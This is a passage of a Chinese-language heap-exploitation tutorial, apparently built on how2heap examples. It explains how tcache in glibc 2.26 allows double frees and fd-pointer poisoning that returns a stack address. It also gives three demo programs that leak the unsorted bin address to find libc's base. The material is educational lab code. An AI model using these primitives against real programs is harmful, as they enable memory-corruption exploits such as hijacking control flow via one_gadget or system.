            free(b);
            free(a);
            fprintf(stderr, "1st malloc(0x20): %pn", malloc(0x20));
            fprintf(stderr, "2nd malloc(0x20): %pn", malloc(0x20));
            fprintf(stderr, "3rd malloc(0x20): %pn", malloc(0x20));
    }
实验是将同一个chunk释放两次，对于fastbin不能连续调用两次free(a)，因为会检测当前链表头部的chunk与释放的chunk是否为同一个，而在glibc-2.26版本中，只是进入了tcache中，没有多大区别。
但是现在可以把free(b)这一句删除，在glibc-2.26之前的版本，会触发检测到double free的错误
在tcache中则没有检测了，可以将同一块内存同时释放两次。
代码执行效果
a对应chunk(0x602250)中fd指针是指向自己的地址的
## 0x05 fastbin_dup_into_stack
修改过的源码
    #include 
    #include 
    int main()
    {
        unsigned long long stack_var;
        fprintf(stderr, "The address we want malloc() to return is %p.n", 8+(char *)&stack_var);
        int *a = malloc(8);
        int *b = malloc(8);
        int *c = malloc(8);
        free(a);
    //    free(b);//glibc-2.26版本不需要在free(b)了
        free(a);
        unsigned long long *d = malloc(8);
        fprintf(stderr, "1st malloc(8): %pn", d);
        fprintf(stderr, "2nd malloc(8): %pn", malloc(8));//这一句glibc-2.26中也可以删除的，不删除也无所谓，不修改fd指针之前，是循环返回a的地址。
    //    stack_var = 0x20; //glibc-2.26版本不需要满足size字段在对应范围内
        *d = (unsigned long long) (((char*)&stack_var) +  sizeof(d));  //2.26版本之后这里是+，2.25版本是-，因为stack_var变量是伪造chunk的size字段，2.26中fd指向的是另一个chunk的fd，所以是size字段+8，而2.25是指向chunk头，所以是size字段-8
        fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free listn", malloc(8));
        fprintf(stderr, "4th malloc(8): %pn", malloc(8));
    }
这个算是上一个的延续，通过将一个内存块释放两次，那么申请一个出来，就可以修改其fd指针了，控制之后申请返回的地址为任意地址，fastbin的话还需要满足地址+8（也就是size字段）处的值是在对应fastbin范围内，比如栗子中fastbin的大小是0x20，那么指定的其他地址处，size字段值应该是0x20~0x2f。但是对于tcache来说就简单多了，没有double
free检测，没有size字段的检测。  
gdb调试
申请过d之后，0x405260还在tcache中，用户使用内存就是chunk的从fd开始的，因此直接修改*d的值即可
fd已经指向了我们希望返回的地址了，先申请一个chunk将d对应的chunk卸下，查看tcache
最后成功返回指定的地址
PS:house_of_lore对于glibc-2.26版本来说没什么区别，因为代码一个是利用fastbin，一个是利用small
bin，但是tcache范围较大，就都在tcache内了。
## 0x06 unsorted bin attack（glibc-2.25）
unsorted bin attack其实就是泄露unsorted bin 的地址，根据unsorted
bin的地址计算出malloc_area的地址（main_area=unsorted bin –
0x58），从而推算出libc_base的加载地址，那么就能去获取one_gadget的实际地址，或者是知道system函数地址之类的。因为针对unsorted
bin，所以和tcache无关，因此这部分内容其实和标题也无关，算个彩蛋？
这里整理了三个方法，其实就是三种读取到unsorted bin地址的方法。
**方法一**
how2heap的代码给了一个思路是，将内存释放进入unsorted
bin之后，假设这个chunk为p，修改p的bk地址为一个可获取内容的变量地址-2size_t（代码中是一个栈变量），那么再申请一个chunk
p大小所对应的的内存，会将p从链表中取出，此时
_p- >fd = unsorted bin 头部 = FD_
_p- >bk = 栈变量-2_size_t = BK
卸下链表的操作就是
FD->bk = BK （这个是导致unsorted bin之后申请的内存为栈地址）
BK->fd = FD（此时BK->fd 就是BK的地址加上2*size_t，所以就是栈变量地址，那么就是获取了unsorted bin 的地址）
**方法二**
UAF的方法，当chunk进入unsorted
bin，直接输出fd或者bk的值（之前如果是空的话），如果之前unsortedbin有值，那么最好还是输出bk的值保险（合并的情况排除 ）
**方法三**
有两个连续的chunk p和q，其中p的大小是大于fastbin的，那么free之后是会进入unsorted
bin的，然后修改p的大小（通过溢出漏洞，如果没有这个方法就没办法用了）为p+q的大小（即理解为p和q是合并为一个chunk了），那么再去申请一个chunk
p对应大小的内存，会将假装合并的p+q的chunk分隔出来，将p分配出去，从而修改了chunk q的fd和bk，会指向unsorted
bin，那么去读取chunk q的fd或者bk即可。
###  方法一示例
方法一就是how2heap内的源码，未做修改，直接看下过程。
先申请一个chunk p，再申请个malloc(500)是为了防止free(p)时，p被top chunk合并。
free(p)之后，chunk 进入unsorted bin
然后修改p的bk指针为栈变量地址-2site_t（也可以修改p的fd指针为栈变量地址-3size_t）
然后申请一个chunk p 对应的大小，会将p从链表中卸下，此时栈变量存储的就是unsorted bin的地址了。
###  方法二示例
UAF，演示代码
    #include 
    #include 
    int main(){
            unsigned long *p=malloc(400);
            malloc(500);
            free(p);
            printf("p[1] is at %p:%pn",p,(void*)p[1]);
    }
emmm，没什么说明的了。
###  方法三示例
通过修改unsortedbin中chunk的size，达到分割chunk来获取unsorted bin的地址
源码
    #include 
    #include 
    int main(){
            unsigned long *p=malloc(0x100);
            unsigned long *q=malloc(0x40);
            free(p);
            *(p-1) = 0x161;
            printf("free(p) and p's value is %pn",(void *)p[0]);
            unsigned long *t = malloc(0x100);
            printf("t is at %pn",t);
            printf("p is at %pn",p);
            printf("q's value is %pn",(void *)q[0]);
    }
申请两个内存，p和q，对应chunk大小分别是0x110和0x50
此时修改p的size大小（其实只要p的大小+4*size_t就可以了，但是不想分割q了）为p+q的大小和，所以是0x160，再加上最低位表示前一个chunk在使用，所以修改值为0x161，此时查看heap可以看到q好像被合并了
再申请一个0x100的内存，就是再将p分割出来，此时q的fd和bk就是指向unsortedbin了，而此时q是从未释放过的，所以读取q的值算正常操作，因此能获取到unsorted
bin的地址。